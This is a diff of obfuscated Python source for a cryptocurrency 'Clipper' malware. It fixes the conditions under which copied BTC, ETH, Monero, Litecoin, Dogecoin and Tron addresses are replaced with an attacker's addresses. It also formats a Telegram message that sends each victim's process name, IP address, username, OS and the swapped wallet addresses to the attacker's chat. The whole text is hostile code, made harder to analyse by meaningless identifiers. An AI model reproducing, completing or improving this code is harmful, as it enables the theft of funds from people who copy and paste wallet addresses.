@@ -139,7 +139,7 @@ def redugh8(btr43, we8098, fweui89, ewfxe32):
 async def egreger453645(wadwa32, fexccxvxcew, ewsfuin8934, fweijf):
     try:
         zh5 = ef9igj48(token=kuhio49)
-        eguo6643 = f'💰 [Clipper]\n\nProcess Name: **{wadwa32}**\n\nIP: **{efewrf}**\nUser: **{ewsjinf783.getlogin()}**\nOS: **{awdewa98ßu43} {awdewa98ßu43we}**\nWallet: {fexccxvxcew}\n\nAddress: **{ewsfuin8934}**\nReplaced: **{fweijf}**'
+        eguo6643 = f'💰 [Clipper]\n\nProcess Name: **{wadwa32}**\n\nIP: **{efewrf}**\nUser: **{ewsjinf783.getlogin()}**\nOS: **{awdewa98ßu43} {awdewa98ßu43we}**\nWallet: **{fexccxvxcew}**\n\nAddress: **{ewsfuin8934}**\nReplaced: **{fweijf}**'
         await zh5.send_message(chat_id=kuhioxx49, text=eguo6643)
     except Exception as e:
         pass
@@ -179,7 +179,7 @@ def vdsu281cjm():
 
     greduhio.sleep(0.25)
     if wadyhe_cery11 == True:
-        if hrextr_R2Xoy1 != '' or hrextr_R2Xoy1 != ' ' or hrextr_R2Xoy1 != "%BTC%":
+        if hrextr_R2Xoy1 != '' and hrextr_R2Xoy1 != ' ' and hrextr_R2Xoy1 != "%BTC%":
             frewsuih = yxvcre.getActiveWindow()
             if wadyhe_cery1.group() != hrextr_R2Xoy1:
                 try:
@@ -198,7 +198,7 @@ def vdsu281cjm():
                     wefuh4323.Thread(target=gesnui(frewsuih.title, 'Bitcoin [BTC]', hfruieoawd, hrextr_R2Xoy1)).start()
 
     elif wadyhe_cery22 == True:
-        if hrextr_R2Xoy2 != '' or hrextr_R2Xoy2 != ' ' or hrextr_R2Xoy2 != "%ETH%":
+        if hrextr_R2Xoy2 != '' and hrextr_R2Xoy2 != ' ' and hrextr_R2Xoy2 != "%ETH%":
             frewsuih = yxvcre.getActiveWindow()
             if wadyhe_cery2.group() != hrextr_R2Xoy2:
                 try:
@@ -218,7 +218,7 @@ def vdsu281cjm():
 
 
     elif wadyhe_cery33 == True:
-        if hrextr_R2Xoy3 != '' or hrextr_R2Xoy3 != ' ' or hrextr_R2Xoy3 != "%MONERO%":
+        if hrextr_R2Xoy3 != '' and hrextr_R2Xoy3 != ' ' and hrextr_R2Xoy3 != "%MONERO%":
             frewsuih = yxvcre.getActiveWindow()
             if wadyhe_cery3.group() != hrextr_R2Xoy3:
                 try:
@@ -237,7 +237,7 @@ def vdsu281cjm():
                     wefuh4323.Thread(target=gesnui(frewsuih.title, 'Monero [XMR]', hfruieoawd, hrextr_R2Xoy3)).start()
 
     elif wadyhe_cery44 == True:
-        if hrextr_R2Xoy4 != '' or hrextr_R2Xoy4 != ' ' or hrextr_R2Xoy4 != "%LTC%":
+        if hrextr_R2Xoy4 != '' and hrextr_R2Xoy4 != ' ' and hrextr_R2Xoy4 != "%LTC%":
             frewsuih = yxvcre.getActiveWindow()
             if wadyhe_cery4.group() != hrextr_R2Xoy4:
                 try:
@@ -257,7 +257,7 @@ def vdsu281cjm():
 
 
     elif wadyhe_cery55 == True or wadyhe_cery555 == True or wadyhe_cery5555 == True:
-        if hrextr_R2Xoy5 != '' or hrextr_R2Xoy5 != ' ' or hrextr_R2Xoy5 != "%DOGE%":
+        if hrextr_R2Xoy5 != '' and hrextr_R2Xoy5 != ' ' and hrextr_R2Xoy5 != "%DOGE%":
             frewsuih = yxvcre.getActiveWindow()
             if wadyhe_cery5 is not None or wadyhe_cery00 is not None or wadyhe_cery000 is not None:
                 if wadyhe_cery5 is not None and wadyhe_cery5.group() != hrextr_R2Xoy5:
@@ -303,7 +303,7 @@ def vdsu281cjm():
                     if regh54 != '' or ' ' or '%smtp%':
                         wefuh4323.Thread(target=gesnui(frewsuih.title, 'Dogecoin [DOGE]', hfruieoawd, hrextr_R2Xoy5)).start()
     elif wadyhe_cery66 == True:
-        if hrextr_R2Xoy6 != '' or hrextr_R2Xoy6 != ' ' or hrextr_R2Xoy6 != "%TRX%":
+        if hrextr_R2Xoy6 != '' and hrextr_R2Xoy6 != ' ' and hrextr_R2Xoy6 != "%TRX%":
             frewsuih = yxvcre.getActiveWindow()
             if wadyhe_cery6.group() != hrextr_R2Xoy6:
                 try:
